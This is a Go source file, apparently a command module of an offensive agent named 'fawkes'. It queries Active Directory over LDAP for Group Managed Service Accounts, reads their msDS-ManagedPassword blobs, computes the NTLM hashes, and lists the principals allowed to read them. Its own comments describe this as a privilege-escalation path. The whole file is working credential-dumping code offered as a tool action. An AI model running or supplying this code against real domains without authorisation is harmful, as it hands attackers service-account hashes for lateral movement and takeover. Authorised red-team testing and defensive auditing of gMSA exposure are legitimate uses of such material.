package commands

import (
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
	"golang.org/x/crypto/md4" //nolint:staticcheck // MD4 required for NTLM hash computation
)

// gmsaAccount represents a Group Managed Service Account found in AD
type gmsaAccount struct {
	DN              string   `json:"dn"`
	SAMAccountName  string   `json:"sAMAccountName"`
	DNSHostName     string   `json:"dnsHostName,omitempty"`
	Description     string   `json:"description,omitempty"`
	Enabled         bool     `json:"enabled"`
	PrincipalsAllow []string `json:"principals_allowed,omitempty"` // who can read the password
	NTLMHash        string   `json:"ntlm_hash,omitempty"`          // extracted from msDS-ManagedPassword
	PasswordError   string   `json:"password_error,omitempty"`     // error if password not readable
}

// gmsaOutput is the JSON output for the gmsa action
type gmsaOutput struct {
	Action   string         `json:"action"`
	BaseDN   string         `json:"base_dn"`
	Count    int            `json:"count"`
	Readable int            `json:"readable"`
	Accounts []gmsaAccount  `json:"accounts"`
}

// MSDS_MANAGEDPASSWORD_BLOB layout (MS-ADTS Section 2.2.17):
//   Version:                         uint16 (offset 0)
//   Reserved:                        uint16 (offset 2)
//   Length:                           uint32 (offset 4)
//   CurrentPasswordOffset:            uint16 (offset 8)
//   PreviousPasswordOffset:           uint16 (offset 10, 0 if none)
//   QueryPasswordIntervalOffset:      uint16 (offset 12)
//   UnchangedPasswordIntervalOffset:  uint16 (offset 14)
//   CurrentPassword:                  variable (UTF-16LE, at CurrentPasswordOffset)
//   PreviousPassword:                 variable (UTF-16LE, at PreviousPasswordOffset)
const (
	gmsaBlobMinSize                = 16
	gmsaBlobVersionExpected        = 1
	gmsaBlobCurrentPasswordOffset  = 8
	gmsaBlobPreviousPasswordOffset = 10
)

// ldapQueryGMSA enumerates Group Managed Service Accounts and attempts to extract
// their managed passwords. This is a common AD privilege escalation path: any
// principal allowed to read msDS-ManagedPassword can extract the NTLM hash.
func ldapQueryGMSA(conn *ldap.Conn, args ldapQueryArgs, baseDN string) structs.CommandResult {
	// Step 1: Find all gMSA accounts
	gmsaFilter := "(objectClass=msDS-GroupManagedServiceAccount)"
	gmsaAttrs := []string{
		"sAMAccountName", "distinguishedName", "dNSHostName",
		"description", "userAccountControl",
		"msDS-GroupMSAMembership",    // ACL: who can read the password
		"msDS-ManagedPasswordId",     // Password identifier (exists if gMSA is active)
	}

	searchRequest := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 30, false,
		gmsaFilter,
		gmsaAttrs,
		nil,
	)

	result, err := conn.SearchWithPaging(searchRequest, 100)
	if err != nil {
		return errorf("Error searching for gMSA accounts: %v", err)
	}

	if len(result.Entries) == 0 {
		return successResult("[*] No Group Managed Service Accounts found in " + baseDN)
	}

	output := gmsaOutput{
		Action:   "gmsa",
		BaseDN:   baseDN,
		Count:    len(result.Entries),
		Accounts: make([]gmsaAccount, 0, len(result.Entries)),
	}

	for _, entry := range result.Entries {
		account := gmsaAccount{
			DN:             entry.DN,
			SAMAccountName: entry.GetAttributeValue("sAMAccountName"),
			DNSHostName:    entry.GetAttributeValue("dNSHostName"),
			Description:    entry.GetAttributeValue("description"),
		}

		// Check if account is enabled (bit 0x2 of userAccountControl = ACCOUNTDISABLE)
		uacStr := entry.GetAttributeValue("userAccountControl")
		if uacStr != "" {
			var uac int
			fmt.Sscanf(uacStr, "%d", &uac)
			account.Enabled = (uac & 0x2) == 0
		}

		// Parse msDS-GroupMSAMembership to see who can read the password
		membershipBlob := entry.GetRawAttributeValue("msDS-GroupMSAMembership")
		if len(membershipBlob) > 0 {
			account.PrincipalsAllow = parseGMSAMembership(conn, membershipBlob, baseDN)
		}

		// Step 2: Try to read msDS-ManagedPassword for this account
		passwordBlob := readGMSAPassword(conn, entry.DN)
		if passwordBlob != nil {
			ntlm, parseErr := parseManagedPasswordBlob(passwordBlob)
			if parseErr != nil {
				account.PasswordError = parseErr.Error()
			} else {
				account.NTLMHash = ntlm
				output.Readable++
			}
		} else {
			account.PasswordError = "access denied or attribute not readable"
		}

		output.Accounts = append(output.Accounts, account)
	}

	outputJSON, _ := json.Marshal(output)
	return successResult(string(outputJSON))
}

// readGMSAPassword attempts to read msDS-ManagedPassword for a specific gMSA account.
// Returns the raw binary blob, or nil if access is denied.
func readGMSAPassword(conn *ldap.Conn, dn string) []byte {
	searchRequest := ldap.NewSearchRequest(
		dn,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		[]string{"msDS-ManagedPassword"},
		nil,
	)

	result, err := conn.Search(searchRequest)
	if err != nil || len(result.Entries) == 0 {
		return nil
	}

	blob := result.Entries[0].GetRawAttributeValue("msDS-ManagedPassword")
	if len(blob) == 0 {
		return nil
	}
	return blob
}

// parseManagedPasswordBlob parses the MSDS-MANAGEDPASSWORD_BLOB binary format
// and extracts the NTLM hash from the current password.
func parseManagedPasswordBlob(blob []byte) (string, error) {
	if len(blob) < gmsaBlobMinSize {
		return "", fmt.Errorf("blob too small: %d bytes (need >= %d)", len(blob), gmsaBlobMinSize)
	}

	version := binary.LittleEndian.Uint16(blob[0:2])
	if version != gmsaBlobVersionExpected {
		return "", fmt.Errorf("unexpected blob version %d (expected %d)", version, gmsaBlobVersionExpected)
	}

	length := binary.LittleEndian.Uint32(blob[4:8])
	if int(length) > len(blob) {
		return "", fmt.Errorf("blob length field %d exceeds actual size %d", length, len(blob))
	}

	currentOffset := binary.LittleEndian.Uint16(blob[gmsaBlobCurrentPasswordOffset : gmsaBlobCurrentPasswordOffset+2])
	if int(currentOffset) >= len(blob) {
		return "", fmt.Errorf("current password offset %d beyond blob size %d", currentOffset, len(blob))
	}

	// Determine password length: if previous password exists, it defines the end
	// Otherwise, password runs to the query interval offset or end of blob
	previousOffset := binary.LittleEndian.Uint16(blob[gmsaBlobPreviousPasswordOffset : gmsaBlobPreviousPasswordOffset+2])

	var passwordEnd int
	if previousOffset > 0 && int(previousOffset) < len(blob) {
		passwordEnd = int(previousOffset)
	} else {
		// Use query password interval offset as the end marker
		queryIntervalOffset := binary.LittleEndian.Uint16(blob[12:14])
		if queryIntervalOffset > 0 && int(queryIntervalOffset) < len(blob) {
			passwordEnd = int(queryIntervalOffset)
		} else {
			passwordEnd = len(blob)
		}
	}

	if int(currentOffset) >= passwordEnd {
		return "", fmt.Errorf("password offset %d >= end %d", currentOffset, passwordEnd)
	}

	passwordBytes := blob[currentOffset:passwordEnd]

	// The password is already UTF-16LE. Compute the NTLM hash directly from these bytes.
	// NTLM hash = MD4(UTF-16LE(password))
	// Since the blob already stores UTF-16LE, we hash it directly.
	hash := md4.New()
	hash.Write(passwordBytes)
	ntlmHash := hex.EncodeToString(hash.Sum(nil))

	return strings.ToUpper(ntlmHash), nil
}

// parseGMSAMembership attempts to parse the msDS-GroupMSAMembership security descriptor
// to identify which principals can read the managed password.
func parseGMSAMembership(conn *ldap.Conn, blob []byte, baseDN string) []string {
	// msDS-GroupMSAMembership is a Windows Security Descriptor (SDDL format in binary).
	// It follows the same SECURITY_DESCRIPTOR structure as nTSecurityDescriptor.
	// We extract the DACL and resolve SIDs to names.

	if len(blob) < 20 {
		return nil
	}

	var principals []string

	// Simple SID extraction: scan for well-known SID patterns in the blob
	// Full SD parsing would reuse the DACL parser, but for membership enumeration
	// we just need the allowed SIDs from the DACL's ACEs.
	sids := extractSIDsFromBlob(blob)
	for _, sid := range sids {
		name := resolveGMSASID(conn, sid, baseDN)
		if name != "" {
			principals = append(principals, name)
		}
	}

	return principals
}

// extractSIDsFromBlob scans a binary security descriptor for SID structures.
// SIDs start with 0x01 (revision) followed by sub-authority count.
func extractSIDsFromBlob(blob []byte) []string {
	var sids []string
	seen := make(map[string]bool)

	for i := 0; i < len(blob)-8; i++ {
		// SID header: Revision=1, SubAuthorityCount (1-15)
		if blob[i] != 0x01 {
			continue
		}
		subAuthCount := int(blob[i+1])
		if subAuthCount < 1 || subAuthCount > 15 {
			continue
		}

		// SID total size: 8 (header + authority) + 4*subAuthCount
		sidLen := 8 + 4*subAuthCount
		if i+sidLen > len(blob) {
			continue
		}

		sid := decodeSID(blob[i : i+sidLen])
		if sid != "" && !seen[sid] {
			seen[sid] = true
			sids = append(sids, sid)
		}
	}

	return sids
}

// decodeSID decodes a binary SID into its string representation (S-1-5-...).
func decodeSID(data []byte) string {
	if len(data) < 8 {
		return ""
	}

	revision := data[0]
	subAuthCount := int(data[1])
	if subAuthCount < 1 || subAuthCount > 15 || len(data) < 8+4*subAuthCount {
		return ""
	}

	// Authority is 6 bytes big-endian
	authority := uint64(0)
	for j := 0; j < 6; j++ {
		authority = (authority << 8) | uint64(data[2+j])
	}

	parts := []string{fmt.Sprintf("S-%d-%d", revision, authority)}
	for j := 0; j < subAuthCount; j++ {
		subAuth := binary.LittleEndian.Uint32(data[8+4*j : 8+4*j+4])
		parts = append(parts, fmt.Sprintf("%d", subAuth))
	}

	return strings.Join(parts, "-")
}

// resolveGMSASID resolves a SID string to a friendly name.
func resolveGMSASID(conn *ldap.Conn, sid string, baseDN string) string {
	// Check well-known SIDs first
	wellKnown := map[string]string{
		"S-1-5-18":     "SYSTEM",
		"S-1-5-19":     "LOCAL SERVICE",
		"S-1-5-20":     "NETWORK SERVICE",
		"S-1-5-32-544": "BUILTIN\\Administrators",
		"S-1-5-32-545": "BUILTIN\\Users",
		"S-1-5-9":      "Enterprise Domain Controllers",
		"S-1-5-11":     "Authenticated Users",
		"S-1-1-0":      "Everyone",
		"S-1-5-10":     "SELF",
	}

	if name, ok := wellKnown[sid]; ok {
		return name
	}

	// Skip non-domain SIDs
	if !strings.HasPrefix(sid, "S-1-5-21-") {
		return sid
	}

	// Query AD for the SID
	escapedSID := ldapEncodeSID(sid)
	if escapedSID == "" {
		return sid
	}

	searchReq := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		1, 5, false,
		fmt.Sprintf("(objectSid=%s)", escapedSID),
		[]string{"sAMAccountName", "cn"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return sid
	}

	name := result.Entries[0].GetAttributeValue("sAMAccountName")
	if name == "" {
		name = result.Entries[0].GetAttributeValue("cn")
	}
	if name == "" {
		return sid
	}
	return name
}

// ldapEncodeSID converts a SID string (S-1-5-21-...) to LDAP binary search format.
func ldapEncodeSID(sid string) string {
	parts := strings.Split(sid, "-")
	if len(parts) < 4 || parts[0] != "S" {
		return ""
	}

	// Parse revision and authority
	var revision uint8
	fmt.Sscanf(parts[1], "%d", &revision)
	var authority uint64
	fmt.Sscanf(parts[2], "%d", &authority)
	subAuthCount := len(parts) - 3

	// Build binary SID
	data := make([]byte, 8+4*subAuthCount)
	data[0] = revision
	data[1] = byte(subAuthCount)
	// Authority: 6 bytes big-endian
	for j := 5; j >= 0; j-- {
		data[2+j] = byte(authority & 0xFF)
		authority >>= 8
	}
	// Sub-authorities: little-endian uint32
	for j := 0; j < subAuthCount; j++ {
		var subAuth uint32
		fmt.Sscanf(parts[3+j], "%d", &subAuth)
		binary.LittleEndian.PutUint32(data[8+4*j:], subAuth)
	}

	// Convert to LDAP escaped format
	var sb strings.Builder
	for _, b := range data {
		sb.WriteString(fmt.Sprintf("\\%02x", b))
	}
	return sb.String()
}
